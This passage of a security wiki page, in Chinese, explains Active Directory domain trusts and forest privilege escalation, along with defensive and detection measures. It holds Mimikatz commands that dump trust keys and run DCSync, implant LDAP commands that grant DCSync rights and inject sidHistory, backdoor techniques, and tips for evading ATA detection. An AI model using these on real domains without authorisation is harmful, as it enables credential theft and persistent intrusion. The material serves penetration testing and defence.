[在这里了解什么是 SSP (Security Support Provider)。](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
你可以创建自己的 **SSP**，以 **capture** 以 **clear text** 形式用于访问机器的凭据。


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

它会在 AD 中注册一个 **new Domain Controller**，并使用它来 **push attributes**（SIDHistory, SPNs...）到指定对象上，且**不会**留下任何关于这些 **modifications** 的 **logs**。你**需要 DA** 权限，并且必须位于 **root domain**。\
注意，如果你使用了错误的数据，就会出现相当难看的日志。


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

前面我们讨论了如果你有 **enough permission to read LAPS passwords**，如何提升权限。然而，这些密码也可用于 **maintain persistence**。\
查看：


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft 将 **Forest** 视为安全边界。这意味着 **compromising a single domain could potentially lead to the entire Forest being compromised**。

### Basic Information

[**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) 是一种安全机制，使一个 **domain** 的用户能够访问另一个 **domain** 中的资源。它本质上是在两个域的认证系统之间建立连接，使认证验证能够无缝传递。当域建立 trust 时，它们会在各自的 **Domain Controllers (DCs)** 中交换并保存特定的 **keys**，这些 key 对 trust 的完整性至关重要。

在典型场景中，如果用户想访问一个 **trusted domain** 中的服务，他必须先从自己域的 DC 请求一个特殊票据，称为 **inter-realm TGT**。这个 TGT 使用两个域共同约定的共享 **key** 进行加密。然后用户将这个 TGT  प्रस्तुत给 **trusted domain 的 DC**，以获取服务票据（**TGS**）。当 trusted domain 的 DC 成功验证 inter-realm TGT 后，它会签发一个 TGS，使用户能够访问该服务。

**Steps**：

1. **Domain 1** 中的一台 **client computer** 使用其 **NTLM hash** 向自己的 **Domain Controller (DC1)** 请求一个 **Ticket Granting Ticket (TGT)**。
2. 如果客户端成功通过认证，DC1 会签发一个新的 TGT。
3. 然后客户端向 DC1 请求一个 **inter-realm TGT**，这是访问 **Domain 2** 中资源所必需的。
4. 该 inter-realm TGT 使用作为双向 domain trust 一部分、由 DC1 和 DC2 共享的 **trust key** 加密。
5. 客户端把 inter-realm TGT 带到 **Domain 2 的 Domain Controller (DC2)**。
6. DC2 使用共享的 trust key 验证 inter-realm TGT，如果有效，就会为客户端想访问的 Domain 2 中的 server 签发一个 **Ticket Granting Service (TGS)**。
7. 最后，客户端向 server 出示这个 TGS；它使用 server 的 account hash 加密，以获得对 Domain 2 中该服务的访问。

### Different trusts

需要注意的是，**a trust can be 1 way or 2 ways**。在双向选项中，两个域会互相信任；但在 **1 way** trust 关系中，一个域是 **trusted**，另一个是 **trusting** 域。在后一种情况下，**你只能从 trusted 域访问 trusting 域中的资源**。

如果 Domain A trusts Domain B，那么 A 是 trusting domain，B 是 trusted one。此外，在 **Domain A** 中，这会是 **Outbound trust**；而在 **Domain B** 中，这会是 **Inbound trust**。

**Different trusting relationships**

- **Parent-Child Trusts**: 这是同一 forest 内常见的设置，其中子域会自动与其父域建立双向可传递 trust。实际上，这意味着认证请求可以在父域和子域之间无缝流动。
- **Cross-link Trusts**: 也称为 "shortcut trusts"，它们建立在子域之间，以加快 referral 过程。在复杂 forest 中，认证 referral 通常必须先到 forest root 再下行到目标域。通过创建 cross-links，这段路径会被缩短，这在地理分散的环境中特别有用。
- **External Trusts**: 这是在不同、无关联的域之间建立的，且本质上不可传递。根据 [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)，external trusts 对于访问当前 forest 之外、且未通过 forest trust 连接的域中的资源很有用。通过 external trusts 的 SID filtering 可增强安全性。
- **Tree-root Trusts**: 这类 trust 会自动建立在 forest root domain 和新添加的 tree root 之间。虽然不常见，但 tree-root trusts 对于向 forest 中添加新的 domain trees 很重要，它们能让新树保持唯一的 domain name，并确保双向可传递性。更多信息可参见 [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)。
- **Forest Trusts**: 这类 trust 是两个 forest root domains 之间的双向可传递 trust，同时也会强制执行 SID filtering 以增强安全措施。
- **MIT Trusts**: 这类 trust 是与非 Windows、[RFC4120-compliant](https://tools.ietf.org/html/rfc4120) 的 Kerberos 域建立的。MIT trusts 更专门一些，适用于需要与 Windows 生态之外基于 Kerberos 的系统集成的环境。

#### Other differences in **trusting relationships**

- trust relationship 也可以是 **transitive**（A trust B，B trust C，那么 A trust C）或 **non-transitive**。
- trust relationship 也可以设置为 **bidirectional trust**（双方互信）或 **one-way trust**（只有一方信任另一方）。

### Attack Path

1. **Enumerate** trusting relationships
2. 检查是否有任何 **security principal**（user/group/computer）能够 **access** 另一域的资源，可能是通过 ACE entries，或因为加入了另一域的组。查找跨域的 **relationships**（trust 的建立也许正是为了这个）。
1. 在这种情况下，kerberoast 也可能是另一个选项。
3. **Compromise** 能够跨域 **pivot** 的 **accounts**。

攻击者可以通过三种主要机制访问另一个域中的资源：

- **Local Group Membership**：主体可能被加入到机器上的本地组中，例如服务器上的 “Administrators” 组，从而获得对该机器的重大控制权。
- **Foreign Domain Group Membership**：主体也可以是 foreign domain 中组的成员。不过，这种方法的有效性取决于 trust 的性质以及该组的作用范围。
- **Access Control Lists (ACLs)**：主体可能被指定在 **ACL** 中，尤其是作为 **DACL** 中 **ACEs** 的实体，从而获得对特定资源的访问。想进一步了解 ACLs、DACLs 和 ACEs 的机制，可参考白皮书 “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” ，这是一份非常有价值的资料。

### Find external users/groups with permissions

你可以检查 **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** 来找到域中的 foreign security principals。它们会是来自 **an external domain/forest** 的 user/group。

你可以在 **Bloodhound** 中检查这一点，或者使用 powerview：
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### 子到父 forest 权限提升
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
枚举域信任的其他方法：
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> 有 **2 个 trusted keys**，一个用于 _Child --> Parent_，另一个用于 _Parent_ --> _Child_。\
> 你可以用以下命令获取当前 domain 正在使用的那个：
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

通过利用 trust 和 SID-History injection，将权限提升为 Enterprise admin，从 child/parent domain 提权：


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

理解 Configuration Naming Context (NC) 如何被利用至关重要。Configuration NC 作为 Active Directory (AD) 环境中整个 forest 配置数据的中央存储库。这些数据会复制到 forest 内的每个 Domain Controller (DC)，而可写的 DC 会维护一份可写的 Configuration NC 副本。要利用这一点，必须在某个 DC 上拥有 **SYSTEM privileges**，最好是 child DC。

**Link GPO to root DC site**

Configuration NC 的 Sites 容器包含 AD forest 内所有加入 domain 的计算机 sites 的信息。通过在任意 DC 上获得 SYSTEM privileges，攻击者可以将 GPOs 链接到 root DC sites。此操作通过操纵应用于这些 sites 的 policies，可能会危及 root domain。

更深入的信息可参考 [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research)。

**Compromise any gMSA in the forest**

一种攻击向量是针对 domain 中有特权的 gMSAs。KDS Root key 对计算 gMSAs 的 passwords 至关重要，它存储在 Configuration NC 中。拥有任意 DC 的 SYSTEM privileges 后，就可以访问 KDS Root key，并计算 forest 中任意 gMSA 的 passwords。

详细分析和逐步指导可参考：


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

补充的 delegated MSA attack（BadSuccessor – abusing migration attributes）：


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

额外外部研究：[Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent)。

**Schema change attack**

这种方法需要耐心，等待新的 privileged AD objects 被创建。拥有 SYSTEM privileges 后，攻击者可以修改 AD Schema，为任何 user 授予对所有 classes 的完全控制。这可能导致对新创建的 AD objects 的未授权访问和控制。

更多内容可阅读 [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent)。

**From DA to EA with ADCS ESC5**

ADCS ESC5 漏洞针对对 Public Key Infrastructure (PKI) objects 的控制，创建一个 certificate template，从而实现以 forest 内任意 user 身份进行 authentication。由于 PKI objects 位于 Configuration NC 中，攻陷一个可写的 child DC 使得执行 ESC5 attacks 成为可能。

更多细节可阅读 [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c)。在没有 ADCS 的场景中，攻击者也可以自行搭建所需组件，如 [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/) 中所述。

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
在这种情况下，**你的域** 被一个外部域 **信任**，从而让你对它拥有 **未确定的权限**。你需要找出**你的域中的哪些 principal 对外部域拥有哪些访问权限**，然后尝试利用它：


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### External Forest Domain - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
在这种场景中，**你的 domain** 正在向来自**不同 domains**的主体授予一些**privileges**。

然而，当一个 **domain is trusted** 被 trusting domain 信任时，trusted domain 会**创建一个用户**，这个用户有一个**可预测的名字**，并把 **trusted password** 作为**密码**。这意味着可以从 trusting domain 访问一个用户，进而进入 trusted domain，枚举它并尝试提升更多 privileges：


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

另一种 compromise trusted domain 的方法，是找到一个 [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links)，它是在 domain trust 的**相反方向**创建的（这并不常见）。

另一种 compromise trusted domain 的方法，是等待在一台 **user from the trusted domain can access** 的机器上通过 **RDP** 登录。然后，attacker 可以在 RDP session process 中注入 code，并从那里**访问 victim 的 origin domain**。\
此外，如果 **victim mounted his hard drive**，那么从 **RDP session** process 中 attacker 可以把 **backdoors** 存到硬盘的 **startup folder** 里。这个技巧叫做 **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- 通过 SID Filtering，可缓解利用 forest trusts 中 SID history attribute 的攻击风险；该功能默认在所有 inter-forest trusts 上启用。其基础假设是 intra-forest trusts 是安全的，并且按照 Microsoft 的观点，forest 而不是 domain 才是 security boundary。
- 但是有一个问题：SID filtering 可能会干扰 applications 和 user access，因此有时会被关闭。

### **Selective Authentication:**

- 对于 inter-forest trusts，使用 Selective Authentication 可确保来自两个 forests 的 users 不会被自动 authenticated。相反，users 要访问 trusting domain 或 forest 中的 domains 和 servers，必须获得显式 permissions。
- 需要注意的是，这些措施无法防护 writable Configuration Naming Context (NC) 的利用，也无法防护对 trust account 的攻击。

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) 将 bloodyAD 风格的 LDAP primitives 重新实现为 x64 Beacon Object Files，它们完全在 on-host implant（例如 Adaptix C2）内部运行。操作员使用 `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` 编译该包，加载 `ldap.axs`，然后从 beacon 调用 `ldap <subcommand>`。所有流量都通过当前 logon security context 经由 LDAP (389) 传输，并带有 signing/sealing，或通过 LDAPS (636) 传输并自动信任证书，因此不需要 socks proxies 或 disk artifacts。

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, 和 `get-groupmembers` 会把短名称/OU paths 解析为完整 DN，并导出相应 objects。
- `get-object`, `get-attribute`, 和 `get-domaininfo` 会提取任意 attributes（包括 security descriptors）以及来自 `rootDSE` 的 forest/domain metadata。
- `get-uac`, `get-spn`, `get-delegation`, 和 `get-rbcd` 会直接从 LDAP 暴露 roasting candidates、delegation settings，以及现有的 [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors。
- `get-acl` 和 `get-writable --detailed` 会解析 DACL，列出 trustees、rights（GenericAll/WriteDACL/WriteOwner/attribute writes）以及 inheritance，从而立即给出 ACL privilege escalation 的目标。
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP 写入原语用于权限提升与持久化

- Object creation BOFs（`add-user`、`add-computer`、`add-group`、`add-ou`）允许操作者在存在 OU 权限的任何位置创建新的 principals 或 machine accounts。`add-groupmember`、`set-password`、`add-attribute` 和 `set-attribute` 在找到 write-property 权限后可直接劫持目标。
- 以 ACL 为重点的命令，如 `add-ace`、`set-owner`、`add-genericall`、`add-genericwrite` 和 `add-dcsync`，会把任何 AD 对象上的 WriteDACL/WriteOwner 转化为密码重置、组成员控制或 DCSync 复制权限，而且不会留下 PowerShell/ADSI 痕迹。对应的 `remove-*` 命令用于清理注入的 ACEs。

### 委派、roasting 与 Kerberos 滥用

- `add-spn`/`set-spn` 会立即让被攻陷用户变得可被 Kerberoast；`add-asreproastable`（UAC 切换）会将其标记为可进行 AS-REP roasting，而无需修改密码。
- 委派宏（`add-delegation`、`set-delegation`、`add-constrained`、`add-unconstrained`、`add-rbcd`）会从 beacon 重写 `msDS-AllowedToDelegateTo`、UAC 标志或 `msDS-AllowedToActOnBehalfOfOtherIdentity`，从而启用 constrained/unconstrained/RBCD 攻击路径，并消除对远程 PowerShell 或 RSAT 的需求。

### sidHistory 注入、OU 迁移与攻击面塑形

- `add-sidhistory` 会向受控 principal 的 SID history 注入特权 SID（见 [SID-History Injection](sid-history-injection.md)），通过 LDAP/LDAPS 完整实现隐蔽的访问继承。
- `move-object` 会更改 computers 或 users 的 DN/OU，使攻击者可以把资产拖入那些已存在委派权限的 OU，然后再滥用 `set-password`、`add-groupmember` 或 `add-spn`。
- 作用范围严格的移除命令（`remove-attribute`、`remove-delegation`、`remove-rbcd`、`remove-uac`、`remove-groupmember` 等）允许操作者在收集 credentials 或持久化之后快速回滚，从而尽量减少 telemetry。

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## 一些通用防御

[**在这里了解更多关于如何保护 credentials。**](../stealing-credentials/credentials-protections.md)

### **Credential 保护的防御措施**

- **Domain Admins 限制**：建议 Domain Admins 只能允许登录到 Domain Controllers，避免在其他主机上使用。
- **Service Account 权限**：服务不应使用 Domain Admin (DA) 权限运行，以保持安全性。
- **临时权限限制**：对于需要 DA 权限的任务，应限制其持续时间。可通过以下方式实现：`Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay 缓解**：审计 Event IDs 2889/3074/3075，然后在 DCs/clients 上强制启用 LDAP signing 和 LDAPS channel binding，以阻止 LDAP MITM/relay 尝试。

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Impacket 活动的协议级指纹识别

如果你想检测常见的 AD tradecraft，**不要只依赖操作者可控的痕迹**，例如重命名的二进制文件、服务名、临时 batch 文件或输出路径。先建立合法 Windows 客户端如何构建 [Kerberos](kerberos-authentication.md)、[NTLM](../ntlm/README.md)、SMB、LDAP、DCE/RPC 和 WMI 流量的基线，然后寻找即使操作者修改了 `psexec.py`、`wmiexec.py`、`dcomexec.py`、`atexec.py` 或 `ntlmrelayx.py` 之后仍然存在的**实现特征**。

- **高置信度独立候选项**（在你自己的基线中验证后）：
- 认证后的 DCE/RPC 使用 `auth_context_id = 79231 + ctx_id`
- DCE/RPC authentication padding 使用 `0xff` 填充
- LDAP Kerberos binds 将原始 Kerberos `AP-REQ` 直接放入 SPNEGO `mechToken`
- SMB2/3 negotiate requests 带有看起来像 ASCII 的 `ClientGuid` 值
- WMI `IWbemLevel1Login::NTLMLogin` 使用非标准 namespace `//./root/cimv2`
- 硬编码 Kerberos nonce 值
- **更适合作为关联/评分特征**：
- 稀疏或重复的 Kerberos etype lists、异常或缺失的 `PA-DATA`，或与原生 Windows 不同的 TGS-REQ etype 顺序
- 缺少 version info 的 NTLM Type 1 消息，或带有空 host names 的 Type 3 消息
- 在 DCE/RPC 中承载的原始 NTLMSSP，而不是 SPNEGO，缺少 DCE/RPC verification trailers，或 SPNEGO/Kerberos OID 不匹配
- 来自同一 host/user/session/time window 的多个这类特征，比任何单个弱字段都强得多
- **用于 enrichment，而不是独立告警**：
- 默认文件名、输出路径、随机服务名、临时 batch 名、默认 computer account 名，以及工具特定的 HTTP/WebDAV/RDP/MSSQL 字符串
- 这些很容易被操作者更改，最适合用来解释为什么一个跨协议 cluster 可疑
- **操作说明**：
- 某些信号需要解密后的流量、[PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md)、ETW 或服务端可见性
- 在将其升级为告警前，先用 Samba/Linux clients、appliances 和 legacy software 进行验证
- 随着基线置信度提升，将检测从 enrichment -> hunting -> alerting 逐步升级

### **实施 deception 技术**

- 实施 deception 包括设置陷阱，例如 decoy users 或 computers，并赋予诸如密码不过期或被标记为 Trusted for Delegation 等特性。详细方法包括创建具有特定权限的用户或将其加入高权限组。
- 一个实际示例是使用如下工具：`Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- 更多关于部署 deception 技术的信息可在 [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception) 找到。

### **识别 deception**

- **针对 User Objects**：可疑指标包括异常的 ObjectSID、不频繁的 logons、创建日期以及较低的 bad password counts。
- **一般指标**：比较潜在 decoy objects 与真实对象的属性差异可以揭示不一致性。像 [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) 这样的工具可以帮助识别此类 deception。

### **绕过检测系统**

- **Microsoft ATA Detection Bypass**：
- **User Enumeration**：避免在 Domain Controllers 上进行 session enumeration，以防止 ATA detection。
- **Ticket Impersonation**：使用 **aes** keys 创建 ticket 有助于规避检测，因为不会降级到 NTLM。
- **DCSync Attacks**：建议从非 Domain Controller 执行，以避免 ATA detection；直接从 Domain Controller 执行会触发告警。

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)
- [ThatTotallyRealMyth/Impacket-IoCs – Dissecting Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)

{{#include ../../banners/hacktricks-training.md}}
